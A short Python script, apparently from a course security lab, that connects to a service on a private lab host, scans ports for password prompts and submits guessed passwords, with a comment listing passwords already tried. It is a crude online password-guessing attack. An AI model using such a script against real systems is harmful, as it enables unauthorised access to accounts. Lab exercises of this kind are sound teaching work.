import re
import socket
import time

HOST = '192.168.1.10'
SKELETONKEY = 'Passepartout'
BYTES = 1024
CRUZID = 'bosdhill\n'
PASSWORD = "Palace"
# tried
# Gunners
# gunners
# GUNNERS
# Manchester
# MANCHESTER
# manchester
# Zinfandel
# ZINFANDEL
# zinfandel
# merlot
# Merlot
# MERLOT

def get_next_password_from_dictionary():
     return PASSWORD

def crack_password(port, s):
     PORT = 10247
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     s.sendall(SKELETONKEY)
     time.sleep(2)
     data = s.recv(BYTES)
     s.sendall(CRUZID)
     data = s.recv(BYTES)
     s.sendall(get_next_password_from_dictionary())
     data = s.recv(BYTES)
     if data == '':
          print("Sleep for 602 seconds.")
     elif data == 'Incorrect password, goodbye.':
          print('Didnt work.')
     else:
          print("Password cracked! It is %s" % PASSWORD)
     print("data received: %s\n" % data)

def try_ports():
     fp = open("out", "r")
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((HOST, PORT))
          s.sendall(SKELETONKEY)
          time.sleep(2)
          data = s.recv(BYTES)
          s.sendall(CRUZID)
          data = s.recv(BYTES)
          if data == 'Password: ':
               print('Received %s from port %d' % (repr(data), PORT))
               crack_password(PORT, s)

if __name__ == "__main__":
     s = []
     port = []
     crack_password(port, s)







